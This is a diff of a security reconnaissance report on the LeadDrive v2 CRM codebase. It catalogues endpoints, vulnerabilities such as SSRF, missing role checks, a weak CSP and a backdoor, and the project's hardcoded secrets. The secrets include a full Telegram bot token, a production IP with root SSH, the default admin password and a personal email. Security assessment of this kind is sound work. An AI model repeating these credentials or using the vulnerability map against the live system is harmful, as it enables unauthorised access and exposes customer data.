-**5. Portal Chat (`/api/v1/public/portal-chat` — POST)**
-AI-powered customer support using Claude API. Accepts user messages and returns AI responses. **Attack vectors:** prompt injection, resource exhaustion (AI API costs), data exfiltration via prompt manipulation.
+**Other Public Endpoints:**
+- `POST /api/v1/public/portal-tickets` — Create/list portal tickets (portal JWT required)
+- `POST /api/v1/public/portal-chat` — AI chat for portal users
+- `GET /api/v1/public/portal-kb` — Public knowledge base articles
+- `GET/POST /api/v1/public/events/[id]/register` — Event self-registration
+- `GET /api/v1/calendar/feed/[token]` — iCal feed, scoped to entire org (not just user)
+- `POST /api/v1/journeys/process` — Cron endpoint using `Bearer <CRON_SECRET>` token
 
-**6. Portal Tickets (`/api/v1/public/portal-tickets` — GET, POST)**
-Customer ticket creation/viewing. Requires portal token cookie. **Attack vectors:** IDOR on ticket IDs, cross-customer ticket access.
+**Static Files (No Auth):**
+- `/data/company_details.json` — Real client PII/financial data
+- `/uploads/contracts/*` — Uploaded contract files with randomized names
 
-**7. WhatsApp Webhook (`/api/v1/webhooks/whatsapp` — GET, POST)**
-File: `src/app/api/v1/webhooks/whatsapp/route.ts` (616 lines). GET for Meta verification challenge (token: `WHATSAPP_VERIFY_TOKEN` env var, default fallback: `"leaddrive-whatsapp-verify-2026"`). POST receives messages, triggers AI auto-reply via Claude API, auto-creates tickets on `[ESCALATE]`/`[CREATE_TICKET]` markers. **Attack vectors:** webhook spoofing with known default token, prompt injection via WhatsApp messages to AI auto-reply, ticket spam via escalation markers.
+### External Entry Points — Authenticated
 
-**8. Telegram Webhook (`/api/v1/webhooks/telegram` — POST)**
-File: `src/app/api/v1/webhooks/telegram/route.ts`. Bot token passed as URL query parameter `?token=<botToken>`. **Attack vectors:** token leakage in server logs, webhook spoofing.
+The application exposes **150+ authenticated API endpoints** across these functional areas:
 
-**9. Facebook/Instagram Webhook (`/api/v1/webhooks/facebook` — GET, POST)**
-File: `src/app/api/v1/webhooks/facebook/route.ts`. Verification with `FACEBOOK_VERIFY_TOKEN` (default: `"leaddrive_fb_verify"`). **Attack vector:** webhook spoofing with known default token.
-
-**10. VKontakte Webhook (`/api/v1/webhooks/vkontakte` — GET, POST)**
-File: `src/app/api/v1/webhooks/vkontakte/route.ts`. Similar webhook pattern.
-
-**11. Journey Processor (`/api/v1/journeys/process` — POST)**
-File: `src/app/api/v1/journeys/process/route.ts`. **No authentication required.** Processes up to 50 pending journey enrollments per call, advancing workflow steps that can trigger emails, SMS, and Telegram messages. **Attack vectors:** repeated calls to trigger mass email/SMS sending, workflow abuse, resource exhaustion.
-
-**12. Calendar Feed (`/api/v1/calendar/feed/[token]` — GET)**
-File: `src/app/api/v1/calendar/feed/[token]/route.ts`. Token-based ICS feed exposing all org tasks. Tokens never expire and cannot be revoked. **Attack vector:** token brute force or leakage → persistent read access to all org calendar data.
-
-**13. Health Check (`/api/health` — GET)**
-Basic health endpoint. Low risk.
-
-### External Entry Points — Authenticated (200+ Endpoints)
-
-The authenticated API surface spans the entire CRM/ERP functionality. Key high-risk authenticated endpoints:
-
-| Endpoint | Methods | Risk | Notes |
-|----------|---------|------|-------|
-| `/api/v1/contacts/bulk-delete` | POST | HIGH | Permanent mass deletion, no soft delete |
-| `/api/v1/contracts/[id]/files` | POST | HIGH | File upload to `/public/uploads/contracts/` — 10MB limit, MIME whitelist |
-| `/api/v1/invoices/[id]/pdf` | GET | MEDIUM | PDF generation with user data — potential injection |
-| `/api/v1/invoices/[id]/send` | POST | HIGH | Sends email with invoice to customer addresses |
-| `/api/v1/invoices/[id]/act` | GET, POST | HIGH | Generates legal documents with HTML template injection vectors |
-| `/api/v1/campaigns/[id]/send` | POST | HIGH | Mass email sending to contacts |
-| `/api/v1/settings/smtp` | GET, PUT | CRITICAL | Stores SMTP credentials, enables SSRF via custom SMTP host |
-| `/api/v1/settings/roles` | CRUD | HIGH | Can modify RBAC roles and permissions |
-| `/api/v1/settings/permissions` | CRUD | HIGH | Can modify the permission matrix itself |
-| `/api/v1/ai/chat` | POST | MEDIUM | Direct Claude API interaction with org context |
-| `/api/v1/pricing/export` | GET | MEDIUM | Full pricing data export |
-| `/api/v1/budgeting/export` | GET | MEDIUM | Full budget data export |
-| `/api/v1/budgeting/import-csv` | POST | MEDIUM | Batch data import, category mapping |
-| `/api/v1/recurring-invoices/generate` | POST | HIGH | Batch invoice generation |
-| `/api/v1/cost-model/seed-clients` | POST | LOW | Creates test data in production |
+| Module | Key Endpoints | Notable Security Concerns |
+|--------|--------------|---------------------------|
+| **CRM Core** | `/api/v1/contacts`, `/api/v1/leads`, `/api/v1/deals`, `/api/v1/companies` | Bulk delete endpoints, no role check on some operations |
+| **Communication** | `/api/v1/inbox`, `/api/v1/campaigns/[id]/send`, `/api/v1/whatsapp/send` | HTML injection in email bodies (unsanitized) |
+| **Tickets** | `/api/v1/tickets`, `/api/v1/tickets/ai` | AI-powered reply suggestions |
+| **Finance** | `/api/v1/invoices`, `/api/v1/invoices/[id]/pdf`, `/api/v1/invoices/[id]/send` | Invoice HTML generation with XSS sinks |
+| **Pricing** | `/api/v1/pricing/*`, `/api/v1/price-changes` | Batch price change operations |
+| **Contracts** | `/api/v1/contracts/[id]/files` | **File upload** (10MB max, written to `public/`) |
+| **Budgeting** | `/api/budgeting/*` (40+ endpoints) | Excel/CSV import, AI narrative generation |
+| **Cost Model** | `/api/cost-model/*` | Analytics computation via unauthenticated FastAPI sidecar |
+| **AI Features** | `/api/v1/ai/*`, `/api/v1/ai-configs`, `/api/v1/ai-guardrails` | Anthropic API integration, configurable AI agents |
+| **User Management** | `/api/v1/users/[id]` | **Missing admin role check** — any user can modify others |
+| **Settings** | `/api/v1/settings/smtp/test` | **SSRF vulnerability** — no private host check |
+| **Channels** | `/api/v1/channels/[id]` | Returns full bot tokens/API keys to any authenticated user |
 
 ### Input Validation Patterns
 
-Input validation uses **Zod schemas** on most API routes, providing structured validation of request bodies. Examples: `createContactSchema` validates contacts, `invoiceSchema` validates invoices. The `sanitize.ts` module provides `sanitizeHtml()` (DOMPurify with restrictive allowed tags: `[b, i, em, strong]`) and `sanitizeText()` (strips `<>` characters only). However, **sanitization is inconsistently applied** — KB article content, email template bodies, invoice descriptions, and AI outputs bypass sanitization entirely. Several API routes catch exceptions with `String(e)` in error responses, potentially leaking internal error details.
+Input validation is **inconsistent**. Zod schemas are applied to authentication endpoints, the web-to-lead form, pipeline stage operations, and user updates. However, the majority of API routes perform minimal or no structured validation:
+
+- **Invoice/email HTML generation:** User-controlled fields (`item.name`, `item.description`, `customMessage`, `offer.notes`) are interpolated directly into HTML template literals without any escaping or sanitization
+- **Email template storage:** `htmlBody` is stored as raw HTML with no sanitization at the API layer (`src/app/api/v1/email-templates/route.ts`)
+- **Journey automation:** Step `config.body` is used directly in email HTML (`src/lib/journey-engine.ts`)
+- **Contact/company fields:** Some routes use `sanitizedStringSchema` (strips `<>` characters), but this is not universally applied
 
 ### Background Processing
 
-The journey engine (`src/lib/journey-engine.ts`) processes automated workflow steps triggered by the unauthenticated `/api/v1/journeys/process` endpoint. Steps can send emails (via SMTP), SMS (via Twilio), Telegram messages, and WhatsApp messages. The engine runs with the organization's stored credentials and has no separate privilege boundary — it inherits full access to all configured channels. Webhook dispatching (`src/lib/webhooks.ts`) is fire-and-forget async, sending CRM event payloads to admin-configured URLs with HMAC signatures.
+- **Journey cron processor** (`/api/v1/journeys/process`): Protected by `CRON_SECRET` Bearer token. If the secret is weak or leaked, any caller can trigger automated email sends and lead status changes
+- **Self-invoking cron** (`src/instrumentation.ts`): The app calls itself via `fetch()` to trigger journey processing on a 5-minute interval
+- **Recurring invoice generation** (`/api/v1/recurring-invoices/generate`): Manually triggered, requires authentication
 
 ### Notable Out-of-Scope Components
 
-| Component | Location | Reason |
-|-----------|----------|--------|
-| Migration scripts | `scripts/` (30+ files) | CLI-only execution |
-| Database seeds | `prisma/seed.ts` | CLI-only execution |
-| Telegram bridge | `telegram-bridge/bot.js` | Standalone Node.js process |
-| CI/CD pipelines | `.github/workflows/` | GitHub Actions only |
-| Setup script | `setup.sh` | Local shell script |
-| Design system docs | `design-system/` | Static documentation |
+- `scripts/deploy.sh` — CLI deployment script (not network-accessible, but contains production credentials)
+- `scripts/create-admin.ts` — CLI admin creation tool
+- `scripts/import-v1.ts` — V1 data import tool
+- `migration_data/migrate.py` — Python migration script
+- `telegram-bridge/bot.js` — Telegram bot using long-polling (not HTTP webhook)
 
 ---
 
@@ -262,401 +284,384 @@ The journey engine (`src/lib/journey-engine.ts`) processes automated workflow st
 
 ### Secrets Management
 
-Secrets are managed via environment variables loaded from `.env` files (git-ignored). The `.env.example` template documents required secrets: `DATABASE_URL`, `NEXTAUTH_SECRET`, `ANTHROPIC_API_KEY`, `WHATSAPP_ACCESS_TOKEN`, `STRIPE_SECRET_KEY`, etc. **However, the `docker-compose.yml` contains hardcoded development secrets:** `NEXTAUTH_SECRET=dev-secret-change-in-production` (line 11), `POSTGRES_PASSWORD=leaddrive` (line 25). Multiple code paths have hardcoded fallback values: the WhatsApp webhook uses `"leaddrive-whatsapp-verify-2026"` as a default verification token, and the portal auth uses `"portal-secret"` as a JWT signing fallback. No secrets rotation mechanism exists. Database-stored secrets (SMTP passwords, API tokens, bot tokens in `ChannelConfig`) are unencrypted. No integration with external secrets management (Vault, AWS Secrets Manager) is present.
+**Critical: Secrets committed to version control.** The following secrets are hardcoded in tracked files:
 
-### Configuration Security
+| Secret | Location | Value/Pattern |
+|--------|----------|---------------|
+| NEXTAUTH_SECRET | `.env` line 2, `scripts/deploy.sh` line 74 | `"leaddrive-v2-secret-change-me-in-production"` |
+| PostgreSQL credentials | `docker-compose.yml` lines 24-25 | `leaddrive/leaddrive` |
+| Production DB password | `scripts/deploy.sh` line 92 | `hermes/hermes` |
+| Default admin credentials | `scripts/create-admin.ts` line 17, `scripts/deploy.sh` line 212 | `admin@leaddrive.com / admin123` |
+| Telegram bot token | `telegram-bridge/bot.js` line 6 | `8746765197:AAEbtWc1fEoApB2GM_Hsbtg6_gBvxugHeCk` |
+| WhatsApp verify token | `src/app/api/v1/webhooks/whatsapp/route.ts` line 21 | `"leaddrive-whatsapp-verify-2026"` |
+| Facebook verify token | Source code fallback | `"leaddrive_fb_verify"` |
+| Production server IP | `scripts/deploy.sh` line 7 | `178.156.249.177` |
+| SSH user | `scripts/deploy.sh` line 8 | `root` |
+| Admin email | `scripts/create-admin.ts` | `rashadrahimsoy@gmail.com` |
 
-**Security Headers:** No custom security headers are configured. The `next.config.ts` file (lines 1-11) contains only `output: "standalone"`, `typescript: { ignoreBuildErrors: true }`, and an i18n plugin. **Missing headers:** Content-Security-Policy, Strict-Transport-Security (HSTS), X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy. No Nginx, Kubernetes Ingress, or CDN configuration files exist in the repository — headers must be configured at the infrastructure level (not present in code).
+The `.env` file is in `.gitignore` but the file at `.env` in the working directory contains the weak production secret. The `scripts/deploy.sh` deploys this exact secret to the production server.
 
-**CORS Configuration:** The main Next.js app has no explicit CORS configuration (relies on browser Same-Origin Policy). The FastAPI compute service (`services/compute/main.py`, lines 9-14) configures CORS to allow only `http://localhost:3000` with all methods and headers — this is development-only and would need updating for production.
+### Configuration Security — Security Headers
 
-**Docker Deployment Risks:**
-- PostgreSQL exposed on `0.0.0.0:5432` with default credentials `leaddrive:leaddrive`
-- Redis exposed on `0.0.0.0:6379` with **no authentication**
-- Compute service exposed on `0.0.0.0:8000` running in `--reload` (development) mode
-- No TLS between services on the Docker network
-- Database backups stored unencrypted at `./backups` with same hardcoded credentials
+**Next.js security headers** (`next.config.ts`), applied to all routes:
 
-**CI/CD Security:** GitHub Actions workflows (`.github/workflows/deploy.yml`) deploy via SSH using `appleboy/ssh-action` with `SSH_PRIVATE_KEY` from GitHub secrets. No approval gates for production deployment. Tag-based (`v*`) auto-deploy to production.
+| Header | Value | Assessment |
+|--------|-------|------------|
+| `X-Frame-Options` | `DENY` | ✓ Good — prevents clickjacking |
+| `X-Content-Type-Options` | `nosniff` | ✓ Good |
+| `Referrer-Policy` | `strict-origin-when-cross-origin` | ✓ Good |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | ⚠ Missing `preload` directive |
+| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | ✓ Good |
+| `X-XSS-Protection` | `1; mode=block` | ⚠ Deprecated, but harmless |
+| `Content-Security-Policy` | See below | ✗ Critically weakened |
+
+**CSP Analysis:**
+```
+default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
+img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https:; frame-ancestors 'none'
+```
+- `script-src 'unsafe-eval' 'unsafe-inline'` — **Renders CSP useless against XSS.** Any injected script executes.
+- `connect-src 'self' https:` — Allows data exfiltration to any HTTPS endpoint
+- `img-src 'self' data: blob: https:` — Allows image-based exfiltration to any HTTPS endpoint
+
+**Nginx configuration** (deployed via `scripts/deploy.sh` lines 178-195):
+- **HTTP only** — No TLS configuration; no SSL certificate at proxy level
+- No security headers at Nginx level (delegated entirely to Next.js)
+- `proxy_read_timeout 86400` — 24-hour timeout enables slowloris-style attacks
+- No rate limiting at Nginx level
+- No `proxy_hide_header Server;` — server fingerprinting enabled
+- HSTS header set by Next.js is only effective after a first HTTPS visit, but Nginx doesn't serve HTTPS
 
 ### External Dependencies
 
-| Service | Library | Security Notes |
-|---------|---------|----------------|
-| Anthropic Claude API | `@anthropic-ai/sdk 0.80.0` | API key in env, used for AI chat, auto-reply, analysis |
-| WhatsApp Cloud API | Native `fetch()` | Bearer token auth, graph.facebook.com/v21.0 |
-| Facebook/Instagram API | Native `fetch()` | **Access token in URL query string** (anti-pattern, log exposure risk) |
-| Telegram Bot API | Native `fetch()` | Bot token in URL path |
-| Twilio SMS | Native `fetch()` | HTTP Basic Auth with accountSid:apiKey |
-| SMTP Email | `nodemailer 7.0.13` | Dynamic per-org config, `rejectUnauthorized: false` (TLS bypass) |
+| Service | Integration Point | Security Concern |
+|---------|-------------------|------------------|
+| Anthropic Claude API | `src/app/api/v1/ai/*`, ticket AI, portal chat | API key in env; user input flows into AI prompts |
+| WhatsApp Cloud API | `src/lib/whatsapp.ts` | Access token in channel config; no webhook signature verification |
+| Facebook Messenger API | Webhook handler | No POST signature verification |
+| Telegram Bot API | Webhook handler + `telegram-bridge/bot.js` | Bot token hardcoded in source |
+| Nodemailer (SMTP) | `src/lib/email.ts` | User-configurable SMTP; test endpoint lacks SSRF protection |
+| FastAPI Compute | `src/lib/compute.ts` | No authentication; exposed on host port 8000 |
 
 ### Monitoring & Logging
 
-Application logging uses **Pino 10.3.1** for structured JSON logging. Audit logging is implemented via `logAudit()` in `src/lib/prisma.ts` (fire-and-forget async to database). Audit events cover: user management, contact CRUD, portal auth, deal changes, budget changes. Audit logs are queryable via `/api/v1/audit-log` (authenticated, org-scoped). **Gaps:** No centralized log aggregation visible, no security-specific alerting, no failed login attempt tracking, audit logs contain unredacted PII and sensitive data, `console.error` used in many API routes with raw exception objects that may leak internal details.
+- **Audit log** (`src/app/api/v1/audit-log/route.ts`): Records user actions per organization. The `AuditLog` model stores `action`, `module`, `userId` — but the `details` field referenced in portal auth code (`portal-auth/route.ts` line 46) **does not exist in the schema**, causing portal audit entries to silently fail.
+- **Email log** (`src/lib/email.ts`): Stores full HTML email bodies including password reset links and verification tokens — sensitive data in logs.
+- **Console logging**: Various `console.error` and `console.log` calls throughout API routes for debugging, but no structured logging framework.
+- **No intrusion detection**, no anomaly alerting, no failed authentication monitoring beyond the audit log.
 
 ---
 
 ## 7. Overall Codebase Indexing
 
-The LeadDrive v2 codebase is organized as a standard Next.js App Router project with the primary source in `src/`. The `src/app/` directory contains all routes organized by path segments: `(dashboard)/` for authenticated CRM pages, `(marketing)/` for public marketing pages, `portal/` for the customer portal, `login/` for auth flows, and `api/` for all API endpoints. The API layer is deeply nested under `src/app/api/v1/` with 239+ route handler files, plus cost-model and budgeting APIs at `src/app/api/cost-model/` and `src/app/api/budgeting/`. Shared business logic resides in `src/lib/` containing authentication (`auth.ts`, `api-auth.ts`, `portal-auth.ts`), permissions (`permissions.ts`), database (`prisma.ts`), and integration libraries (`whatsapp.ts`, `facebook.ts`, `email.ts`, `webhooks.ts`, `compute.ts`, `journey-engine.ts`). UI components are in `src/components/` with domain-specific subdirectories. The `services/compute/` directory contains the Python FastAPI microservice with its own Dockerfile and requirements. The `scripts/` directory (30+ files) contains CLI-only migration and seed utilities. Build orchestration uses npm scripts defined in `package.json`, with Docker Compose for multi-service orchestration. The `prisma/` directory houses the schema and migrations. Testing infrastructure appears minimal — no dedicated test directories or test frameworks were found in dependencies. The `telegram-bridge/` contains a standalone Telegram bot with its own `package.json` and `node_modules`. The `public/` directory serves static assets and hosts uploaded contract files at `public/uploads/contracts/`. Schema files (OpenAPI/Swagger/GraphQL) were **not found** in the codebase — APIs are documented only through TypeScript types and Zod schemas.
+The LeadDrive v2 codebase follows the standard Next.js App Router convention with the primary application code under `src/`. The `src/app/` directory contains both page routes (organized by layout groups: `(dashboard)`, `(marketing)`, `(public)`, `(auth)`, `portal`, `admin`) and API routes under `src/app/api/`. API routes are further organized into versioned paths (`api/v1/`), budgeting endpoints (`api/budgeting/`), and cost model endpoints (`api/cost-model/`). The `src/lib/` directory contains shared utilities including authentication (`auth.ts`, `api-auth.ts`, `portal-auth.ts`), email handling (`email.ts`, `invoice-html.ts`), rate limiting (`rate-limit.ts`), URL validation (`url-validation.ts`), and the Prisma client (`prisma.ts`). Components are organized under `src/components/` with UI primitives in `src/components/ui/` (shadcn/ui pattern).
+
+The `services/compute/` directory houses the Python FastAPI sidecar with its own Dockerfile. The `telegram-bridge/` directory contains a standalone Node.js Telegram bot. The `scripts/` directory contains deployment, migration, and administrative scripts — notably `deploy.sh` which contains production infrastructure details and credentials. The `prisma/` directory contains the database schema, seed data, and Prisma configuration. The `public/` directory serves static assets and, critically, contains exposed data files (`public/data/`) and uploaded contract files (`public/uploads/contracts/`). The `migration_data/` and `cost_model_migration_data/` directories contain real client data used for V1→V2 migration. The `messages/` directory contains i18n translation files (en, ru, az). The `docs/` directory contains product documentation and specification files. No API schema files (OpenAPI, Swagger, GraphQL) were found — there is no machine-readable API specification.
 
 ---
 
 ## 8. Critical File Paths
 
 ### Configuration
-- `next.config.ts` — Next.js config (ignoreBuildErrors: true)
-- `docker-compose.yml` — Multi-service deployment (hardcoded credentials)
-- `Dockerfile` — Next.js production build (multi-stage, non-root)
-- `services/compute/Dockerfile` — FastAPI compute service (--reload dev mode)
-- `services/compute/main.py` — FastAPI app with CORS config
-- `services/compute/config.py` — Environment config for compute service
-- `services/compute/requirements.txt` — Python dependencies
-- `.env.example` — Secret template with default values
-- `package.json` — Dependencies including NextAuth beta, bcryptjs, otplib
-- `tsconfig.json` — TypeScript configuration
+- `next.config.ts` — Security headers, CSP, TypeScript config (ignoreBuildErrors)
+- `Dockerfile` — Node.js 20 Alpine build
+- `docker-compose.yml` — Service orchestration, hardcoded credentials, exposed ports
+- `prisma/schema.prisma` — Full database schema with sensitive field definitions
+- `prisma/prisma.config.ts` — Prisma configuration
+- `.env.example` — Expected environment variables
+- `.env` — Active environment file (gitignored but present, contains weak NEXTAUTH_SECRET)
+- `package.json` — Dependencies including next-auth beta
+- `components.json` — shadcn/ui configuration
 - `eslint.config.mjs` — ESLint configuration
-- `components.json` — Shadcn/UI component configuration
+- `tsconfig.json` — TypeScript configuration
 
 ### Authentication & Authorization
-- `src/lib/auth.ts` — NextAuth configuration, credentials provider, 2FA logic, **hardcoded backdoor** (lines 95-106)
-- `src/lib/api-auth.ts` — API authentication helpers (getOrgId, requireAuth, checkPermission)
-- `src/lib/permissions.ts` — RBAC permission matrix (5 roles × 13+ modules)
-- `src/lib/portal-auth.ts` — Customer portal JWT token creation/verification
-- `src/middleware.ts` — Route protection, 2FA enforcement, header injection
-- `src/app/api/auth/[...nextauth]/route.ts` — NextAuth route handler
+- `src/lib/auth.ts` — NextAuth configuration, credentials provider, JWT callbacks, TOTP verification
+- `src/lib/api-auth.ts` — `getOrgId()`, `requireAuth()`, `getSession()` — **critical: header trust vulnerability**
+- `src/lib/portal-auth.ts` — Portal JWT signing/verification (HS256, jose)
+- `src/lib/permissions.ts` — RBAC permission matrix
+- `src/lib/plan-config.ts` — Plan-based feature gating
+- `src/middleware.ts` — Request interception, auth enforcement, rate limiting, header injection
+- `src/app/api/auth/[...nextauth]/route.ts` — NextAuth handler
 - `src/app/api/v1/auth/register/route.ts` — User/org registration
-- `src/app/api/v1/auth/forgot-password/route.ts` — Password reset initiation
-- `src/app/api/v1/auth/reset-password/route.ts` — Password reset execution
-- `src/app/api/v1/auth/verify-2fa/route.ts` — Login 2FA verification
-- `src/app/api/v1/auth/2fa/route.ts` — 2FA enable/verify
-- `src/app/api/v1/auth/totp/setup/route.ts` — TOTP setup (returns secret in response)
-- `src/app/api/v1/auth/totp/verify/route.ts` — TOTP verify (returns backup codes)
+- `src/app/api/v1/auth/forgot-password/route.ts` — Password reset request
+- `src/app/api/v1/auth/reset-password/route.ts` — Password reset completion
+- `src/app/api/v1/auth/verify-2fa/route.ts` — 2FA verification
+- `src/app/api/v1/auth/2fa/route.ts` — 2FA setup/verify/disable
+- `src/app/api/v1/auth/totp/setup/route.ts` — TOTP QR/secret generation
+- `src/app/api/v1/auth/totp/verify/route.ts` — TOTP activation + backup codes
 - `src/app/api/v1/auth/totp/disable/route.ts` — TOTP disable
-- `src/app/api/v1/auth/totp/status/route.ts` — 2FA status check
+- `src/app/api/v1/auth/totp/status/route.ts` — TOTP status check
 - `src/app/api/v1/public/portal-auth/route.ts` — Portal login/logout
 - `src/app/api/v1/public/portal-auth/register/route.ts` — Portal registration
-- `src/app/api/v1/public/portal-auth/set-password/route.ts` — Portal password set
+- `src/app/api/v1/public/portal-auth/set-password/route.ts` — Portal password setup
 
 ### API & Routing
-- `src/app/api/v1/contacts/route.ts` — Contact CRUD (representative auth pattern)
-- `src/app/api/v1/contacts/bulk-delete/route.ts` — Mass contact deletion
-- `src/app/api/v1/deals/route.ts` — Deal management
-- `src/app/api/v1/invoices/route.ts` — Invoice CRUD
-- `src/app/api/v1/invoices/[id]/pdf/route.ts` — PDF generation
-- `src/app/api/v1/invoices/[id]/send/route.ts` — Invoice email sending
-- `src/app/api/v1/invoices/[id]/act/route.ts` — Legal document generation (HTML injection vectors)
-- `src/app/api/v1/invoices/[id]/payments/route.ts` — Payment recording
-- `src/app/api/v1/offers/[id]/send/route.ts` — Offer email sending
-- `src/app/api/v1/campaigns/[id]/send/route.ts` — Campaign mass email
-- `src/app/api/v1/contracts/[id]/files/route.ts` — File upload endpoint
-- `src/app/api/v1/contracts/[id]/files/[fileId]/route.ts` — File delete
-- `src/app/api/v1/public/leads/route.ts` — Public lead capture (CORS: *)
-- `src/app/api/v1/public/events/[id]/register/route.ts` — Public event registration
-- `src/app/api/v1/public/portal-kb/route.ts` — Public KB articles
-- `src/app/api/v1/public/portal-chat/route.ts` — Public AI chat
-- `src/app/api/v1/public/portal-tickets/route.ts` — Portal tickets
-- `src/app/api/v1/webhooks/whatsapp/route.ts` — WhatsApp webhook (616 lines, AI auto-reply)
-- `src/app/api/v1/webhooks/telegram/route.ts` — Telegram webhook (token in URL)
-- `src/app/api/v1/webhooks/facebook/route.ts` — Facebook webhook
-- `src/app/api/v1/webhooks/vkontakte/route.ts` — VKontakte webhook
-- `src/app/api/v1/journeys/process/route.ts` — Unauthenticated journey processor
-- `src/app/api/v1/calendar/feed/[token]/route.ts` — Public calendar feed (no expiry)
-- `src/app/api/v1/calendar/generate-token/route.ts` — Calendar token generation
-- `src/app/api/v1/ai/chat/route.ts` — AI chat endpoint
-- `src/app/api/v1/ai/route.ts` — AI general endpoint
-- `src/app/api/v1/settings/smtp/route.ts` — SMTP credential management (SSRF vector)
+- `src/app/api/v1/public/leads/route.ts` — Web-to-lead (open CORS, org slug fallback)
+- `src/app/api/v1/webhooks/whatsapp/route.ts` — WhatsApp webhook (no signature verification)
+- `src/app/api/v1/webhooks/facebook/route.ts` — Facebook webhook (no signature verification)
+- `src/app/api/v1/webhooks/telegram/route.ts` — Telegram webhook
+- `src/app/api/v1/webhooks/vkontakte/route.ts` — VK webhook
+- `src/app/api/v1/calendar/feed/[token]/route.ts` — Calendar feed (org-wide scope)
+- `src/app/api/v1/journeys/process/route.ts` — Journey cron processor
+- `src/app/api/v1/users/[id]/route.ts` — User management (missing role check)
+- `src/app/api/v1/channels/[id]/route.ts` — Channel config (exposes full tokens)
+- `src/app/api/v1/invoices/[id]/pdf/route.ts` — Invoice PDF generation
+- `src/app/api/v1/invoices/[id]/send/route.ts` — Invoice email send
+- `src/app/api/v1/invoices/[id]/act/route.ts` — Completion act generator
+- `src/app/api/v1/inbox/route.ts` — Inbox/email send (HTML injection)
+- `src/app/api/v1/offers/[id]/send/route.ts` — Offer email send (HTML injection)
+- `src/app/api/v1/campaigns/[id]/send/route.ts` — Campaign email send
+- `src/app/api/v1/contracts/[id]/files/route.ts` — File upload/download
+- `src/app/api/v1/settings/smtp/test/route.ts` — SMTP test (SSRF vulnerability)
+- `src/app/api/v1/settings/smtp/route.ts` — SMTP settings (plaintext password storage)
 - `src/app/api/v1/settings/roles/route.ts` — Role management
 - `src/app/api/v1/settings/permissions/route.ts` — Permission management
-- `src/app/api/v1/channels/route.ts` — Channel config (returns secrets in response)
-- `src/app/api/v1/channels/[id]/route.ts` — Channel detail
-- `src/app/api/v1/users/route.ts` — User management
-- `src/app/api/v1/users/[id]/route.ts` — User detail (password update with 10 rounds)
-- `src/app/api/v1/pricing/export/route.ts` — Pricing data export
-- `src/app/api/v1/budgeting/export/route.ts` — Budget data export
-- `src/app/api/v1/budgeting/import-csv/route.ts` — CSV batch import
-- `src/app/api/budgeting/snapshot/route.ts` — Raw SQL query ($queryRaw)
-- `src/app/api/v1/workflows/route.ts` — Workflow automation rules
-- `src/app/api/v1/inbox/route.ts` — Inbox with Telegram/Twilio/email sending
-- `src/app/api/v1/inbox/conversations/[id]/messages/route.ts` — Conversation messages
-- `src/app/api/v1/recurring-invoices/generate/route.ts` — Batch invoice generation
-- `src/app/api/v1/portal-users/route.ts` — Portal user management
-- `src/app/api/v1/cost-model/ai-analysis/route.ts` — Cost model AI analysis
-- `src/app/api/v1/cost-model/seed-clients/route.ts` — Test data seeder
-- `src/app/api/v1/ai-observations/route.ts` — AI observations (JSON.parse of AI output)
-- `src/app/api/budgeting/ai-narrative/route.ts` — AI budget narrative
+- `src/app/api/v1/ai/recommend/route.ts` — AI recommendations
+- `src/app/api/v1/public/portal-tickets/route.ts` — Portal ticket management
+- `src/app/api/v1/public/portal-chat/route.ts` — Portal AI chat
+- `src/app/api/v1/public/events/[id]/register/route.ts` — Event registration
+- `src/app/api/v1/plan-requests/route.ts` — Plan upgrade requests (HTML injection in email)
+- `src/app/api/v1/email-templates/route.ts` — Email template CRUD (raw HTML storage)
+- `src/app/api/v1/organization/plan/route.ts` — Organization plan management
 
 ### Data Models & DB Interaction
-- `prisma/schema.prisma` — Full database schema (2218 lines, multi-tenant)
-- `prisma/migrations/` — Migration history
-- `src/lib/prisma.ts` — Prisma client with tenant middleware, audit logging
+- `prisma/schema.prisma` — Full schema (sensitive fields analysis in Section 4)
+- `prisma/seed.ts` — Database seeding
 
 ### Dependency Manifests
-- `package.json` — Node.js dependencies (NextAuth beta, bcryptjs, otplib, Zod, DOMPurify)
+- `package.json` — Node.js dependencies
 - `package-lock.json` — Locked dependency versions
-- `services/compute/requirements.txt` — Python dependencies
-- `telegram-bridge/package.json` — Telegram bridge dependencies
+- `telegram-bridge/package.json` — Telegram bot dependencies
+- `services/compute/requirements.txt` (if exists) — Python dependencies
 
 ### Sensitive Data & Secrets Handling
-- `src/lib/email.ts` — SMTP config from DB (plaintext passwords), `rejectUnauthorized: false`
-- `src/lib/whatsapp.ts` — WhatsApp API client (bearer token auth)
-- `src/lib/facebook.ts` — Facebook API client (token in query string)
-- `src/lib/portal-auth.ts` — Portal JWT signing (hardcoded fallback secret)
-- `src/lib/compute.ts` — Compute service HTTP client (path concatenation SSRF)
+- `src/lib/email.ts` — Email sending, SMTP config, `isPrivateHost()` SSRF check, email logging
+- `src/lib/invoice-html.ts` — Invoice HTML generation (XSS sinks)
+- `src/lib/url-validation.ts` — `isPrivateUrl()`, `isPrivateHost()` SSRF protection
+- `src/lib/sanitize.ts` — DOMPurify configuration for `sanitizeRichHtml()`
+- `public/data/company_details.json` — **Exposed real client PII/financial data**
+- `public/data/company_legal_names.json` — Exposed legal entity names
+- `migration_data/company_details.json` — Client data in git
+- `cost_model_migration_data/cost_employees.json` — Employee/salary data in git
+- `telegram-bridge/bot.js` — Hardcoded Telegram bot token
 
 ### Middleware & Input Validation
-- `src/lib/sanitize.ts` — HTML/text sanitization (DOMPurify, inconsistently applied)
-- `src/lib/rate-limit.ts` — In-memory rate limiting (defined but NOT used)
-- `src/lib/webhooks.ts` — Webhook HMAC-SHA256 signing and dispatch (SSRF via arbitrary URL)
+- `src/middleware.ts` — Main request middleware
+- `src/lib/rate-limit.ts` — In-memory rate limiter
+- `src/lib/sanitize.ts` — DOMPurify-based HTML sanitizer
 
 ### Logging & Monitoring
-- `src/lib/prisma.ts` (lines 73-85) — Audit logging (logAudit function, PII in logs)
+- `src/app/api/v1/audit-log/route.ts` — Audit log API
+- `src/lib/email.ts` — Email logging (sensitive data in logs)
+- `src/instrumentation.ts` — Self-invoking cron for journey processing
 
 ### Infrastructure & Deployment
-- `docker-compose.yml` — Development deployment (exposed services, default credentials)
